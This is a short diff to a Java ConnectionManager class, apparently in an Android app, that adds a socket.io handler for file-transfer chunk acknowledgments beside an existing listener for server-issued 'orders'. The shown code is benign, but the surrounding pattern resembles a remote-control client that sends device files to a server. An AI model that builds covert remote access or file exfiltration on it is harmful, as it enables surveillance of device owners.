@@ -546,6 +546,23 @@ public class ConnectionManager {
                     });
 
                     // Handle orders from server
+                    // Listen for chunk ACKs
+                    ioSocket.on("chunk_ack", new Emitter.Listener() {
+                        @Override
+                        public void call(Object... args) {
+                            try {
+                                JSONObject ack = (JSONObject) args[0];
+                                String transferId = ack.optString("transferId", null);
+                                int chunkIndex = ack.optInt("chunkIndex", -1);
+                                if (transferId != null && chunkIndex >= 0) {
+                                    FileManager.handleChunkAck(transferId, chunkIndex);
+                                }
+                            } catch (Exception e) {
+                                Log.e(TAG, "Error handling chunk ACK", e);
+                            }
+                        }
+                    });
+                    
                     ioSocket.on("order", new Emitter.Listener() {
                         @Override
                         public void call(Object... args) {
